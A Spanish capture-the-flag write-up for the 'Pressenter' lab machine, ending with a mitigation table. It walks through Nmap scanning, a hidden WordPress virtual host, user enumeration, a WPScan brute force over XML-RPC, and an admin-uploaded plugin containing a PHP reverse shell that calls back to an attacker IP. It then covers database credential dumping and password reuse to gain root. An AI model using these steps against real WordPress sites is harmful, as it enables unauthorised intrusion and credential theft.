# Writeup — Pressenter

| Campo        | Valor                |
|--------------|----------------------|
| Nombre       | Pressenter           |
| IP objetivo  | 172.17.0.2           |
| Sistema      | Linux (Ubuntu)       |
| Atacante     | Kali Linux           |

---

## 1. Reconocimiento

Empezamos con un escaneo completo de los 65535 puertos TCP con Nmap, lanzando además los scripts por defecto y la detección de versiones:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

| Parámetro | Función |
|-----------|---------|
| `-p-`  | Escanea todos los puertos (1-65535) |
| `-sS`  | SYN scan (sigiloso, requiere root) |
| `-sC`  | Lanza los scripts NSE por defecto |
| `-sV`  | Detecta la versión de los servicios |
| `-vvv` | Máxima verbosidad |
| `-T5`  | Plantilla de tiempo más agresiva |
| `-Pn`  | No hace descubrimiento de host |
| `-n`   | Sin resolución DNS |

Resultado relevante:

```text
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Pressenter CTF
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

Solo hay un puerto abierto: **80/tcp** con **Apache 2.4.58** sobre Ubuntu. El TTL de 64 confirma que es un sistema Linux. Toda la superficie de ataque inicial está, por tanto, en la aplicación web.

---

## 2. Enumeración web

Al visitar `http://172.17.0.2` encontramos la landing page de un evento CTF ficticio, **"Pressenter CTF"**, con varias categorías de retos y un par de enlaces ("Start the Challenge", "Register Now").

### register.html

El enlace "Register Now" lleva a `http://172.17.0.2/register.html`, un formulario de registro con los campos **Username**, **Email**, **Password** y **Confirm Password**. La propia página avisa de que es un *dummy* y no procesa datos.

En el pie de las dos páginas se repite el texto "Find us at" seguido de un enlace casi invisible sobre el fondo oscuro. Merece la pena revisarlo en el código fuente.

### Código fuente: dominio oculto

Al ver el código fuente (`view-source:http://172.17.0.2/register.html`) confirmamos que el formulario no envía nada a ningún sitio (`action="#"`). Lo interesante está en el `footer`, en un párrafo con la clase `hidden-domain`:

```html
<p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
```

La web revela un nombre de dominio, **pressenter.hl**, que probablemente sirve otro contenido mediante *virtual hosting*. Para que nuestra máquina lo resuelva, lo añadimos a `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2      pressenter.hl
```

A partir de aquí podemos acceder a la web por su nombre de dominio: `http://pressenter.hl`.

### pressenter.hl

Al acceder por el dominio obtenemos una web completamente distinta a la de la IP: un sitio titulado **PressEnter** con el lema "Las aventuras de pressi y su fiel hacker." Esto confirma que el servidor usa *virtual hosting* y sirve un sitio diferente según la cabecera `Host`. El contenido es el texto de ejemplo de una plantilla, lo que junto al nombre *Press*Enter apunta a WordPress.

### Identificación del CMS: WordPress 6.6.1

Buscando `generator` en el código fuente de `http://pressenter.hl` confirmamos que el sitio es **WordPress 6.6.1**:

```html
<meta name="generator" content="WordPress 6.6.1" />
```

| Hallazgo  | Detalle |
|-----------|---------|
| Versión   | WordPress 6.6.1 (meta generator) |
| Tema      | `twentytwentyfour` (`/wp-content/themes/twentytwentyfour/`) |
| API REST  | `/index.php?rest_route=/` |
| XML-RPC   | `/xmlrpc.php` |

Al visitar `http://pressenter.hl/xmlrpc.php` responde con `XML-RPC server accepts POST requests only.`, lo que confirma que la interfaz XML-RPC está activa (vector para fuerza bruta de credenciales y enumeración de usuarios).

### Enumeración de usuarios

WordPress permite enumerar los usuarios a través del parámetro `?author=N`, que redirige a la página de archivo de cada autor mostrando su *slug* (nombre de login):

```bash
curl -s "http://pressenter.hl/?author=1"
curl -s "http://pressenter.hl/?author=2"
```

| `?author=` | Usuario | Entradas |
|------------|---------|----------|
| 1 | pressi | Sí (`¡Hola, mundo!`) |
| 2 | Hacker | No se han encontrado entradas |

Obtenemos dos usuarios válidos: **pressi** (administrador por defecto) y **Hacker**.

---

## 3. Explotación: acceso inicial

### Fuerza bruta con WPScan

Con los usuarios identificados, lanzamos WPScan para romper la contraseña de `pressi` por diccionario, aprovechando el endpoint XML-RPC:

```bash
wpscan --url 'http://pressenter.hl/' -U pressi -P /usr/share/wordlists/rockyou.txt
```

El ataque de diccionario tiene éxito en pocos segundos:

```text
[SUCCESS] - pressi / dumbass

[!] Valid Combinations Found:
 | Username: pressi, Password: dumbass
```

| Campo       | Valor |
|-------------|-------|
| Usuario     | pressi |
| Contraseña  | dumbass |
| Vía         | XML-RPC (`system.multicall`) |

### Acceso al panel y RCE vía plugin

Iniciamos sesión en `http://pressenter.hl/wp-admin/` con `pressi:dumbass`. El usuario es administrador, así que podemos subir un **plugin propio** con una reverse shell en PHP.

Creamos un `plugin.php` con la cabecera mínima que WordPress exige, seguida de una *PHP reverse shell* (pentestmonkey) con la IP y el puerto de nuestra máquina atacante:

```php
<?php
/*
Plugin Name: plugin
*/
// ... PHP reverse shell (pentestmonkey) ...
$ip = '10.0.2.15';   // IP de la máquina atacante
$port = 4444;        // puerto a la escucha
```

WordPress solo admite plugins en ZIP, así que lo comprimimos:

```bash
nano plugin.php
zip -r plugin.zip plugin.php
```

> Nota: el orden importa. Es `zip -r <destino>.zip <origen>.php`; al revés da el error `Zip file structure invalid`.

Levantamos el listener en la máquina atacante:

```bash
nc -lvnp 4444
```

En el panel vamos a **Plugins → Añadir nuevo plugin → Subir plugin**, seleccionamos `plugin.zip`, lo instalamos y lo activamos; todo va bien. Después, para disparar la shell, buscamos en el navegador la dirección (por ejemplo `http://pressenter.hl/xmlrpc.php`) y con eso ya estamos dentro: recibimos la conexión en nuestro listener.

```text
connect to [10.0.2.15] from (UNKNOWN) [172.17.0.2] 36262
/bin/sh: 0: can't access tty; job control turned off
$
```

Estabilizamos la shell (`sh` sin TTY):

```bash
script -qc /bin/bash /dev/null
# o: python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 4. Escalada de privilegios

### Enumeración local

Ya como `www-data`, en `/etc/passwd` destaca un usuario con shell de login real:

```bash
cat /etc/passwd | grep -i /bin/bash
```

```text
root:x:0:0:root:/root:/bin/bash
enter:x:1001:1001:enter,,,:/home/enter:/bin/bash
```

El usuario **enter** es nuestro objetivo intermedio. Los binarios SUID son todos estándar, sin nada explotable.

### Credenciales en wp-config.php

El directorio de WordPress es `/var/www/pressenter`. Su configuración contiene las credenciales de la base de datos en claro:

```bash
cat /var/www/pressenter/wp-config.php | grep DB_
```

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'admin' );
define( 'DB_PASSWORD', 'rooteable' );
define( 'DB_HOST', '127.0.0.1' );
```

La contraseña `rooteable` **no** funciona contra `enter` (`su: Authentication failure`), así que seguimos explorando la base de datos.

### Hashes de usuarios de WordPress

Volcamos los hashes de los usuarios de WordPress con `mysql -e` (funciona sin TTY):

```bash
mysql -u admin -prooteable wordpress -e "SELECT user_login,user_pass FROM wp_users;"
```

```text
pressi  $P$BeinDKnzoAYpx.wCePjkJeVNV5plCW.
hacker  $P$BiO9aZSB4m/CMeGjq3o4PPaE4ipdIt/
```

El de `pressi` es `dumbass`. El de `hacker` es phpass (`$P$`), lento de romper, así que en lugar de crackearlo seguimos explorando la base de datos.

### Credenciales en una tabla personalizada

Listando las tablas encontramos una que **no forma parte de WordPress**, `wp_usernames`:

```sql
use wordpress;
show tables;
SELECT * FROM wp_usernames;
```

Contiene unas credenciales en **texto plano**:

```text
enter : kernellinuxhack
```

### Acceso como enter (user flag)

```bash
su enter
# Password: kernellinuxhack
cat /home/enter/user.txt
```

### Escalada a root

El último salto no necesita nada sofisticado: **la misma contraseña de `enter` es válida para root** (reutilización de contraseña del administrador):

```bash
su
# Password: kernellinuxhack
id
cat /root/root.txt
```

Con esto la máquina queda comprometida por completo.

---

## 5. Flags y lecciones aprendidas

### Flags

| Flag | Ubicación |
|------|-----------|
| User | `/home/enter/user.txt` |
| Root | `/root/root.txt` |

### Resumen de la cadena de ataque

1. **Nmap** → único puerto abierto, 80 (Apache 2.4.58).
2. **Código fuente** de `register.html` → dominio oculto `pressenter.hl` (virtual host) → `/etc/hosts`.
3. **WordPress 6.6.1** → enumeración de usuarios con `?author=` (`pressi`, `Hacker`).
4. **XML-RPC** activo + **WPScan** → fuerza bruta → `pressi:dumbass`.
5. **Panel admin** → plugin PHP malicioso en ZIP → reverse shell como `www-data`.
6. **wp-config.php** (`admin:rooteable`) → acceso a **MySQL**.
7. Tabla personalizada **`wp_usernames`** → `enter:kernellinuxhack` en texto plano.
8. **`su enter`** → user flag; **`su` a root** (misma contraseña) → root flag.

### Lecciones aprendidas y mitigaciones

| Debilidad | Mitigación |
|-----------|------------|
| Contraseña débil de WordPress (`dumbass`) | Política de contraseñas robustas + 2FA |
| XML-RPC habilitado (fuerza bruta masiva) | Deshabilitar o restringir `xmlrpc.php` |
| Edición de temas/plugins = RCE para el admin | `DISALLOW_FILE_EDIT` y restringir subida de plugins |
| Credenciales de BD en claro en `wp-config.php` | Permisos estrictos y cuenta de BD con mínimos privilegios |
| Credenciales en texto plano en la BD (`wp_usernames`) | No almacenar nunca contraseñas sin hashear |
| Reutilización de contraseña (BD → enter → root) | Credenciales únicas por cuenta y servicio |

La máquina encadena un fallo tras otro: desde una contraseña trivial en la web hasta la reutilización de una misma clave para el usuario y para root. Cada capa habría frenado al atacante si se hubiera asegurado de forma independiente.
